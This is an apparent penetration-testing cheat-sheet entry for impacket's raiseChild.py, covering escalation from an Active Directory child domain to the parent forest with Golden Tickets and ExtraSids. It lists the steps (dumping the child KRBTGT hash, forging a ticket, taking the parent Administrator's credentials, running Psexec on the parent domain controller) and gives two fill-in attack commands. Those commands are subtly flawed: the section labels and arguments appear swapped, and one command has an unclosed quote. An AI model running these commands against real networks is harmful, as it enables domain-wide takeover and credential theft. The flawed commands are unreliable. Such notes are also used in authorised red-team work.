# raiseChild.py (imp)

% impacket-kerberos, windows, kerberos, 88
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT

## desc
```
child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids
```

## child to forest privilege escalation (creds) 
golden + extraSids
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain
- authenticates to the parent domain's Domain Controller via Psexec (-target-exec ip)
```bash
raiseChild.py -debug -hashes :<nt_hash> <domain_fqdn>/administrator
```

## child to forest privilege escalation (pth) 
golden + extraSids
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain
- authenticates to the parent domain's Domain Controller via Psexec (-target-exec ip)
```bash
raiseChild.py -debug -hashes :<nt_hash> <domain_fqdn>/administrator:'<password>
```

